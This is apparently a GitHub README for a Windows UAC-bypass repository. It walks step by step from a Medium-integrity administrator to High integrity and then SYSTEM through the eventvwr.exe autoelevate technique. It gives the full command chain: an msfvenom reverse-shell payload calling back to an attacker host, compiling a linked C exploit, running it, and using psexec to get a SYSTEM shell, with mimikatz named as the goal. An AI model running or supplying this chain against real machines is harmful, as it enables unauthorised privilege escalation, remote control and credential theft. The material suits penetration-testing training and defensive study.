# UAC-bypass

If you're in Administrator group but are on Medium Mandatory Level, you can't run some commands and tool due to User Account Control. One should need to bypass UAC to get on High Mandatory Level, from there we can become SYSTEM. With UAC enabled we can't run tools like mimikatz, and sometime commands like changing administrator password etc.

# Exploitation

## Check for Permissions
```markdown
whoami /all
```
![OnPaste 20220608-165652](https://user-images.githubusercontent.com/106917304/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png)

We're in administrator group and on Medium Mandatory Level.
## Check For UAC is Enabled
```markdown
reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 
```
![OnPaste 20220608-170237](https://user-images.githubusercontent.com/106917304/172606326-7b52b703-d024-4c97-ad19-29105d509a2f.png)

EnableLUA tells us whether UAC is enabled. If 0 we don’t need to bypass it and we can just PsExec to SYSTEM. If it’s 1 however, then check the other 2 keys 
PromptSecureDesktop is on.


First we ensure that eventvwr.exe exists and is set to autoelevate to High integrity.
```markdown
where /r C:\\windows eventvwr.exe
```
![OnPaste 20220608-170657](https://user-images.githubusercontent.com/106917304/172607955-1ffda1af-2254-4a7e-86a8-7ee739529943.png)


Upload [strings64.exe](https://github.com/k4sth4/UAC-bypass/blob/main/strings64.exe) to target machine.
```markdown
strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate
```

![OnPaste 20220608-171241](https://user-images.githubusercontent.com/106917304/172608066-79407888-b78d-4484-b071-6fed6d09ca48.png)

We can see the value is set to True.

## Making of an Exploit

Now on Atacker machine generate msfvenom payload:
```markdown
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe > shell.exe
```
we gonna use [eventvwr-bypassuac.c](https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)


NOTE: Remember the name of the reverse shell that we generated with msfvenom is shell.exe. If you have given another name to payload, must change the name in C script and both our shell.exe and eventvwr-bypassuac.c needs to be on same directory on attacker vm.

We need to compile the C script to get our exploit.
```markdown
x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe
```

![OnPaste 20220608-172613](https://user-images.githubusercontent.com/106917304/172610444-fbd93a1f-09bf-4a31-b099-0d9f371391b3.png)


## Reverse Shell

Now upload shell.exe and eventvwr-bypassuac-64.exe to target machine and execute eventvwr-bypassuac-64.exe.  
```markdown
.\eventvwr-bypassuac-64.exe 
```
![OnPaste 20220608-173002](https://user-images.githubusercontent.com/106917304/172611083-5c94570f-2d4b-4eef-a7a8-5ea6308fd890.png)

Got Reverse Shell.

![OnPaste 20220608-173131](https://user-images.githubusercontent.com/106917304/172611380-ad7daa97-e036-4d7a-9717-3c8740496d66.png)

We can see that now we are on High Mandatory Level.

![OnPaste 20220608-173341](https://user-images.githubusercontent.com/106917304/172611822-9f2d5991-d494-40a2-9815-ef76f572cfa4.png)

Now we can run mimikatz!

If you want SYSTEM shell we can now become SYSTEM with [psexec64.exe](https://github.com/k4sth4/UAC-bypass/blob/main/psexec64.exe)

Upload psexec64.exe and shell.exe on target machine with High Mandatory Level. Now execute psexec64.exe with shell.exe.
```markdown
.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe
```

After that we'll get a reverse shell as SYSTEM.

